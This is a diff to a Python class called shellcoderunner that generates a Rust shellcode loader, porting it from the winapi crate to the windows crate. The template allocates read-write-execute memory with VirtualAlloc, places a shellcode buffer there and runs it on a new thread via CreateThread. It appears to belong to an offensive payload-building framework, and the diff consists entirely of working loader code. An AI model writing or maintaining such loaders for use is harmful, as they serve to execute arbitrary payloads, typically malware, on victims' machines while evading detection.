@@ -1,16 +1,16 @@
 class shellcoderunner:
 
     def imports(self):
-        return ['extern crate winapi;', 
-                'use winapi::um::memoryapi::VirtualAlloc;', 
-                'use winapi::um::processthreadsapi::CreateThread;', 
-                'use winapi::um::synchapi::WaitForSingleObject;', 
-                'use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};'
-                'use std::ptr::null_mut;'
+        return ['extern crate windows;', 
+                'use windows::Win32::System::Memory::VirtualAlloc;', 
+                'use windows::Win32::System::Threading::CreateThread;', 
+                'use windows::Win32::System::Threading::WaitForSingleObject;', 
+                'use windows::Win32::System::Threading::THREAD_CREATION_FLAGS;'
+                'use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};'
         ]
 
     def compilerOptions(self):
-        return ['winapi = {version = "0.3.9", features = ["winnt", "synchapi", "memoryapi", "processthreadsapi"]}']
+        return ['windows = { version = "0.58", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation"] }']
 
     def template(self):
         return """
@@ -24,7 +24,7 @@ fn main() {{
     {transformers}
     unsafe {{
         let func_addr = VirtualAlloc(
-            null_mut(),
+            None,
             shellcode.len(),
             MEM_COMMIT,
             PAGE_EXECUTE_READWRITE, 
@@ -34,13 +34,13 @@ fn main() {{
 
         let mut thread_id: u32 = 0; 
         let h_thread = CreateThread( 
-            null_mut(), 
+            None, 
             0,
             Some(std::mem::transmute(func_addr)), 
-            null_mut(),
-            0,
-            &mut thread_id as *mut u32, 
-        );
+            None,
+            THREAD_CREATION_FLAGS(0),
+            Some(&mut thread_id as *mut u32), 
+        ).unwrap();
 
         WaitForSingleObject(h_thread, 0xFFFFFFFF); 
     }}
